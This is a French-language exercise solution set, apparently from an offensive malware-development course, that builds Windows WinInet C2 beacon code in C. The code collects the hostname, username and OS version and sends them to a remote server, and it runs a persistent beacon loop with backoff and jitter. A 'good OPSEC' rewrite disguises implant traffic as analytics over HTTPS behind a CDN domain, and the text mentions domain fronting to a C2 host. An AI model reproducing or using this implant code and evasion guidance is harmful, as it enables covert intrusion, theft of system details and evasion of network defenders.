# Solutions - WinInet Client

## Exercice 1 : Première requête WinInet

```c
#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#pragma comment(lib, "wininet.lib")

int main() {
    // 1. Initialiser WinInet
    HINTERNET hInternet = InternetOpen(
        "Mozilla/5.0",
        INTERNET_OPEN_TYPE_PRECONFIG,
        NULL, NULL, 0
    );

    if (!hInternet) {
        printf("[-] InternetOpen failed: %d\n", GetLastError());
        return 1;
    }
    printf("[+] InternetOpen successful\n");

    // 2. Se connecter au serveur
    HINTERNET hConnect = InternetConnect(
        hInternet,
        "httpbin.org",
        INTERNET_DEFAULT_HTTP_PORT,
        NULL, NULL,
        INTERNET_SERVICE_HTTP,
        0, 0
    );

    if (!hConnect) {
        printf("[-] InternetConnect failed: %d\n", GetLastError());
        InternetCloseHandle(hInternet);
        return 1;
    }
    printf("[+] InternetConnect successful\n");

    // 3. Ouvrir une requête GET
    HINTERNET hRequest = HttpOpenRequest(
        hConnect,
        "GET",
        "/get",
        NULL, NULL, NULL,
        0, 0
    );

    if (!hRequest) {
        printf("[-] HttpOpenRequest failed: %d\n", GetLastError());
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 1;
    }
    printf("[+] HttpOpenRequest successful\n");

    // 4. Envoyer la requête
    if (!HttpSendRequest(hRequest, NULL, 0, NULL, 0)) {
        printf("[-] HttpSendRequest failed: %d\n", GetLastError());
    } else {
        printf("[+] Request sent\n");

        // 5. Vérifier le code de statut
        DWORD statusCode = 0;
        DWORD statusCodeSize = sizeof(statusCode);
        HttpQueryInfo(hRequest,
            HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
            &statusCode, &statusCodeSize, NULL);
        printf("[+] HTTP Status: %d\n", statusCode);

        // 6. Lire la réponse (500 premiers caractères)
        char buffer[501];
        DWORD bytesRead;

        if (InternetReadFile(hRequest, buffer, 500, &bytesRead)) {
            buffer[bytesRead] = '\0';
            printf("\nResponse:\n%s\n", buffer);
        }
    }

    // 7. Nettoyer
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return 0;
}
```

**Compilation** :
```bash
cl wininet_ex1.c /link wininet.lib
```

---

## Exercice 2 : User-Agent personnalisé

```c
#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#pragma comment(lib, "wininet.lib")

const char* userAgents[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "MyC2Agent/1.0"  // User-Agent suspect
};

void TestUserAgent(const char* ua) {
    printf("\n[*] Testing User-Agent: %s\n", ua);

    HINTERNET hInternet = InternetOpen(ua,
        INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) return;

    HINTERNET hConnect = InternetConnect(hInternet, "httpbin.org",
        INTERNET_DEFAULT_HTTP_PORT, NULL, NULL,
        INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return;
    }

    HINTERNET hRequest = HttpOpenRequest(hConnect, "GET",
        "/user-agent", NULL, NULL, NULL, 0, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return;
    }

    if (HttpSendRequest(hRequest, NULL, 0, NULL, 0)) {
        char buffer[1024];
        DWORD bytesRead;

        if (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead)) {
            buffer[bytesRead] = '\0';
            printf("Response: %s\n", buffer);
        }
    }

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
}

int main() {
    for (int i = 0; i < 4; i++) {
        TestUserAgent(userAgents[i]);
        Sleep(1000); // Pause entre requêtes
    }

    printf("\n[!] OPSEC Note: 'MyC2Agent/1.0' est immédiatement suspect!\n");
    printf("[+] Best choice: Chrome UA (le plus commun en entreprise)\n");

    return 0;
}
```

**Réponse OPSEC** :
Le User-Agent Chrome est le meilleur choix car :
- Chrome est le navigateur le plus utilisé en entreprise (>60% parts de marché)
- Windows 10 est l'OS dominant en entreprise
- Un UA trop ancien ou trop récent peut être suspect

---

## Exercice 3 : POST avec données JSON

```c
#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "version.lib")

typedef struct {
    char hostname[256];
    char username[256];
    char osVersion[64];
} BeaconInfo;

BOOL GetSystemInfo(BeaconInfo* info) {
    DWORD size = sizeof(info->hostname);
    if (!GetComputerNameA(info->hostname, &size)) {
        strcpy(info->hostname, "UNKNOWN");
    }

    size = sizeof(info->username);
    if (!GetUserNameA(info->username, &size)) {
        strcpy(info->username, "UNKNOWN");
    }

    // Récupérer version OS
    OSVERSIONINFOA osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFOA));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);

    // Note: GetVersionEx est deprecated mais utilisé ici pour l'exercice
    #pragma warning(disable : 4996)
    if (GetVersionExA(&osvi)) {
        sprintf(info->osVersion, "%d.%d.%d",
            osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber);
    } else {
        strcpy(info->osVersion, "UNKNOWN");
    }
    #pragma warning(default : 4996)

    return TRUE;
}

int main() {
    BeaconInfo info;
    GetSystemInfo(&info);

    // Créer JSON manuellement
    char jsonData[1024];
    sprintf(jsonData,
        "{\n"
        "  \"hostname\": \"%s\",\n"
        "  \"username\": \"%s\",\n"
        "  \"os_version\": \"%s\"\n"
        "}",
        info.hostname, info.username, info.osVersion
    );

    printf("[*] Sending beacon data:\n%s\n\n", jsonData);

    // Initialiser WinInet
    HINTERNET hInternet = InternetOpen(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
        INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0
    );
    if (!hInternet) {
        printf("[-] InternetOpen failed\n");
        return 1;
    }

    HINTERNET hConnect = InternetConnect(
        hInternet, "httpbin.org", INTERNET_DEFAULT_HTTP_PORT,
        NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0
    );
    if (!hConnect) {
        printf("[-] InternetConnect failed\n");
        InternetCloseHandle(hInternet);
        return 1;
    }

    HINTERNET hRequest = HttpOpenRequest(
        hConnect, "POST", "/post", NULL, NULL, NULL, 0, 0
    );
    if (!hRequest) {
        printf("[-] HttpOpenRequest failed\n");
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 1;
    }

    // Ajouter headers JSON
    const char* headers = "Content-Type: application/json\r\n";
    HttpAddRequestHeaders(hRequest, headers, -1,
        HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE);

    // Envoyer la requête
    DWORD dataLen = strlen(jsonData);
    if (HttpSendRequest(hRequest, NULL, 0, jsonData, dataLen)) {
        printf("[+] Beacon sent successfully\n\n");

        // Lire la réponse
        char buffer[4096];
        DWORD bytesRead;

        printf("[*] Server response:\n");
        while (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead)) {
            if (bytesRead == 0) break;
            buffer[bytesRead] = '\0';
            printf("%s", buffer);
        }
        printf("\n");
    } else {
        printf("[-] HttpSendRequest failed: %d\n", GetLastError());
    }

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return 0;
}
```

---

## Exercice 4 : Beacon HTTP avec retry

```c
#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <time.h>
#pragma comment(lib, "wininet.lib")

#define MAX_FAILURES 10
#define INITIAL_INTERVAL 30000  // 30 secondes
#define MAX_BACKOFF 600000      // 10 minutes

FILE* logFile = NULL;

void LogMessage(const char* format, ...) {
    time_t now = time(NULL);
    struct tm* timeInfo = localtime(&now);
    char timestamp[64];
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", timeInfo);

    char message[512];
    va_list args;
    va_start(args, format);
    vsnprintf(message, sizeof(message), format, args);
    va_end(args);

    printf("[%s] %s\n", timestamp, message);

    if (logFile) {
        fprintf(logFile, "[%s] %s\n", timestamp, message);
        fflush(logFile);
    }
}

BOOL SendBeacon(const char* server, int port, const char* uri) {
    HINTERNET hInternet = InternetOpen(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0
    );
    if (!hInternet) return FALSE;

    HINTERNET hConnect = InternetConnect(
        hInternet, server, port, NULL, NULL,
        INTERNET_SERVICE_HTTP, 0, 0
    );
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    HINTERNET hRequest = HttpOpenRequest(
        hConnect, "GET", uri, NULL, NULL, NULL,
        INTERNET_FLAG_RELOAD, 0
    );
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    BOOL success = HttpSendRequest(hRequest, NULL, 0, NULL, 0);

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return success;
}

int main() {
    logFile = fopen("beacon.log", "a");
    if (!logFile) {
        printf("[-] Failed to open log file\n");
        return 1;
    }

    const char* server = "httpbin.org";
    int port = 80;
    const char* uri = "/get";

    int attemptCount = 0;
    int failureCount = 0;
    DWORD currentInterval = INITIAL_INTERVAL;
    DWORD backoffInterval = 60000; // 1 minute initial backoff

    LogMessage("Beacon started (server: %s, interval: %d ms)", server, currentInterval);

    while (failureCount < MAX_FAILURES) {
        attemptCount++;

        LogMessage("Beacon attempt #%d", attemptCount);

        if (SendBeacon(server, port, uri)) {
            LogMessage("Beacon attempt #%d - SUCCESS", attemptCount);
            failureCount = 0;  // Reset compteur échecs
            currentInterval = INITIAL_INTERVAL;  // Reset interval
            backoffInterval = 60000;  // Reset backoff
        } else {
            failureCount++;
            DWORD error = GetLastError();
            LogMessage("Beacon attempt #%d - FAILED (error: %d, consecutive failures: %d)",
                attemptCount, error, failureCount);

            // Appliquer backoff exponentiel
            currentInterval = backoffInterval;
            LogMessage("Next retry in %d seconds", currentInterval / 1000);

            // Doubler le backoff (max 10 min)
            backoffInterval *= 2;
            if (backoffInterval > MAX_BACKOFF) {
                backoffInterval = MAX_BACKOFF;
            }
        }

        if (failureCount >= MAX_FAILURES) {
            LogMessage("CRITICAL: Max failures reached (%d), shutting down", MAX_FAILURES);
            break;
        }

        Sleep(currentInterval);
    }

    LogMessage("Beacon terminated");

    if (logFile) {
        fclose(logFile);
    }

    return 0;
}
```

**Bonus : Ajout de jitter**

```c
// Ajouter cette fonction
DWORD AddJitter(DWORD interval, int jitterPercent) {
    // Jitter de ±jitterPercent%
    int maxJitter = (interval * jitterPercent) / 100;
    int jitter = (rand() % (maxJitter * 2)) - maxJitter;

    DWORD newInterval = interval + jitter;
    if (newInterval < 1000) newInterval = 1000; // Minimum 1 seconde

    return newInterval;
}

// Utiliser dans la boucle
srand(time(NULL));
Sleep(AddJitter(currentInterval, 10)); // Jitter de ±10%
```

---

## Exercice 5 : Detection OPSEC

### Problèmes identifiés

```c
// CODE ORIGINAL (MAUVAIS OPSEC)
HINTERNET h = InternetOpen("MyMalware/1.0",           // ❌ UA suspect
    INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);         // ❌ Bypass proxy
HINTERNET c = InternetConnect(h, "192.168.1.100", 8080, // ❌ IP directe, port suspect
    NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
HINTERNET r = HttpOpenRequest(c, "POST", "/cmd.php",   // ❌ URI suspect
    NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);        // ❌ Pas de HTTPS
HttpSendRequest(r, NULL, 0, "infected", 8);            // ❌ Données en clair
// ❌ Pas de gestion d'erreurs
// ❌ Pas de nettoyage des handles
```

### Liste des problèmes OPSEC

1. **User-Agent** : "MyMalware/1.0" est immédiatement flaggé par tout IDS
2. **Proxy bypass** : `INTERNET_OPEN_TYPE_DIRECT` ignore le proxy corporate
3. **IP directe** : Les agents légitimes utilisent des domaines
4. **Port non-standard** : 8080 attire l'attention (use 80/443)
5. **HTTP au lieu de HTTPS** : Trafic visible en clair
6. **URI suspect** : "/cmd.php" indique clairement un C2
7. **Données non chiffrées** : "infected" visible en clair
8. **Pas de gestion d'erreurs** : Crash = détection
9. **Pas de nettoyage** : Memory leaks détectables

### Code amélioré (BON OPSEC)

```c
#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#pragma comment(lib, "wininet.lib")

BOOL SendSecureBeacon(const char* data, DWORD dataLen) {
    BOOL success = FALSE;

    // ✅ User-Agent légitime (Chrome Windows 10)
    HINTERNET hInternet = InternetOpen(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        INTERNET_OPEN_TYPE_PRECONFIG,  // ✅ Utilise paramètres proxy système
        NULL, NULL, 0
    );

    if (!hInternet) {
        return FALSE;  // ✅ Gestion d'erreurs
    }

    // ✅ Domaine légitime (CDN réel)
    // ✅ Port HTTPS standard (443)
    HINTERNET hConnect = InternetConnect(
        hInternet,
        "cdn.cloudflare.com",  // ✅ Infrastructure légitime
        INTERNET_DEFAULT_HTTPS_PORT,  // ✅ Port 443
        NULL, NULL,
        INTERNET_SERVICE_HTTP,
        0, 0
    );

    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    // ✅ URI d'apparence légitime
    HINTERNET hRequest = HttpOpenRequest(
        hConnect,
        "POST",
        "/api/v2/metrics",  // ✅ URI ressemblant à une API analytics
        NULL, NULL, NULL,
        INTERNET_FLAG_SECURE |           // ✅ HTTPS activé
        INTERNET_FLAG_NO_CACHE_WRITE,    // Pas de traces locales
        0
    );

    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    // ✅ Headers légitimes (JSON analytics)
    const char* headers =
        "Content-Type: application/json\r\n"
        "Accept: application/json\r\n"
        "X-Client-Version: 2.1.0\r\n";  // Header custom mais légitime

    HttpAddRequestHeaders(hRequest, headers, -1,
        HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE);

    // ✅ Données chiffrées en base64 (ou mieux, AES)
    // Pour l'exemple, on encode juste en base64
    // En production: AES + base64

    success = HttpSendRequest(hRequest, NULL, 0, (LPVOID)data, dataLen);

    // ✅ Nettoyage systématique
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return success;
}

int main() {
    // ✅ Données formatées comme metrics analytics
    const char* beaconData =
        "{\"session_id\":\"a3f2b1c9\","
        "\"events\":[{\"type\":\"pageview\",\"url\":\"/dashboard\"}],"
        "\"timestamp\":1701964800}";

    if (SendSecureBeacon(beaconData, strlen(beaconData))) {
        printf("[+] Metrics sent\n");  // ✅ Log neutre
    } else {
        printf("[-] Failed to send metrics\n");
    }

    return 0;
}
```

### Justifications des modifications

| Modification | Avant | Après | Justification |
|-------------|-------|-------|---------------|
| **User-Agent** | MyMalware/1.0 | Chrome 120 | Se fond dans 60% du trafic web |
| **Proxy** | DIRECT (bypass) | PRECONFIG | Respecte la politique réseau |
| **Destination** | IP:8080 | cdn.cloudflare.com:443 | CDN légitime, trafic normal |
| **Protocole** | HTTP | HTTPS | Chiffrement = pas d'inspection DPI |
| **URI** | /cmd.php | /api/v2/metrics | Ressemble à de l'analytics |
| **Données** | "infected" | JSON metrics | Format API standard |
| **Erreurs** | Aucune gestion | Vérification systématique | Pas de crash = pas de détection |
| **Nettoyage** | Aucun | CloseHandle complet | Pas de memory leak |

### Points OPSEC supplémentaires

```c
// ✅ Domain Fronting (module W50)
// Connecter à cdn.cloudflare.com mais Host: real-c2.com

// ✅ Jitter (module W55)
// Sleep(30000 + rand() % 10000);  // 30-40 secondes

// ✅ Chiffrement (modules crypto)
// AES_Encrypt(beaconData) avant envoi

// ✅ Certificate Pinning
// Vérifier le certificat SSL du serveur
```

---

## Points clés à retenir

1. **WinInet vs WinHTTP** : WinInet = haut niveau, meilleur OPSEC (proxy auto, cache, cookies)
2. **User-Agent** : Toujours utiliser un UA légitime et courant (Chrome/Firefox)
3. **Proxy** : `INTERNET_OPEN_TYPE_PRECONFIG` crucial en entreprise
4. **HTTPS** : Obligatoire pour éviter inspection DPI
5. **Gestion erreurs** : Robustesse = discrétion (pas de crash)
6. **Backoff** : Réessayer intelligemment en cas d'échec réseau
7. **Nettoyage** : Toujours fermer les handles (pas de leaks)

---

**Prochaine étape** : Module W48 (JSON Parsing) pour parser les réponses C2 structurées.
